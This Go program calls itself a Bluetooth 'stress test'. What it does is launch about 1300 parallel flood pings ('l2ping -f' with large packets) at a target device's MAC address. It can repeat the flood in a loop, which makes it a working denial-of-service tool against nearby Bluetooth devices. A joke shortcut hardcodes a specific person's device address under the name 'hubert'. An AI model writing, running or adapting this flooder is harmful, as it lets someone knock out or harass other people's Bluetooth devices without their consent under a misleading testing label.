package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"sync"
	"syscall"
	"time"
)

func main() {
	numWorkersFlag := flag.Int("n", 1300, "Number of workers to stress test the device. The higher - the stronger the test.")
	loopFlag := flag.Bool("l", false, "Whether to automatically attempt again after a -d (default 10s) delay if the script exits or not.")
	delayFlag := flag.Int("d", 10, "Delay in seconds to wait between continuous attempt when running with -loop flag.")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage of %s:\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Flags (optional, otherwise defaults used):\n")
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "Arguments:\n")
		fmt.Fprintf(os.Stderr, "  Mac Address: address of the device to stress test. Eg. XX:XX:XX:XX:XX:XX.\n")
	}

	flag.Parse()

	if len(flag.Args()) != 1 {
		fmt.Println("Too many arguments provided! Pass in only the MAC address, after the optional flags. Run with -h to see help.")
		os.Exit(1)
	}

	macAddress := flag.Args()[0]

	// hehehe
	if macAddress == "hubert" {
		macAddress = "00:1F:47:E2:25:AC"
	}

	runWorkers(numWorkersFlag, loopFlag, delayFlag, macAddress)

	fmt.Println("Loop flag not set, all workers done. Exiting.")
}

func runWorkers(numWorkersFlag *int, loopFlag *bool, delayFlag *int, macAddress string) {
	signalChannel := make(chan os.Signal, 1)
	signal.Notify(signalChannel, os.Interrupt, syscall.SIGINT)
	workersDone := make(chan struct{})

	done := make(chan struct{})

	var wg sync.WaitGroup

	numWorkers := *numWorkersFlag
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerNum int) {
			defer wg.Done()
			pingWorker(workerNum, done, macAddress)

		}(i)
	}

	go func() {
		wg.Wait()
		close(workersDone)
	}()

	select {
	case <-signalChannel:
		fmt.Println("Stop signal received, stopping workers.")
		close(done)
		os.Exit(0)
	case <-workersDone:
		fmt.Println("All workers done.")
	}

	if *loopFlag == true {
		fmt.Printf("Waiting for %d seconds, then trying again...\n", *delayFlag)
		time.Sleep(time.Duration(*delayFlag) * time.Second)
		runWorkers(numWorkersFlag, loopFlag, delayFlag, macAddress)
	}
}

func pingWorker(workerNum int, done <-chan struct{}, macAddress string) {
	cmd := exec.Command("l2ping", "-s", "600", "-f", macAddress)

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	//fmt.Printf("Worker %d started\n", workerNum)

	resultChannel := make(chan error, 1)

	if err := cmd.Start(); err != nil {
		fmt.Printf("Worker %d failed to start\n", workerNum)
	}

	go func() {
		resultChannel <- cmd.Wait()
	}()

	select {
	case <-done:
		if err := cmd.Process.Kill(); err != nil {
			fmt.Printf("Worker %d failed to be killed: %v\n", workerNum, err)
		} else {
			fmt.Printf("Worker %d killed\n", workerNum)
		}
	case err := <-resultChannel:
		if err != nil {
			fmt.Printf("Worker %d exited with an error: %v\n", workerNum, err)
		} else {
			fmt.Printf("Worker %d exited succesfully\n", workerNum)
		}
	}
}
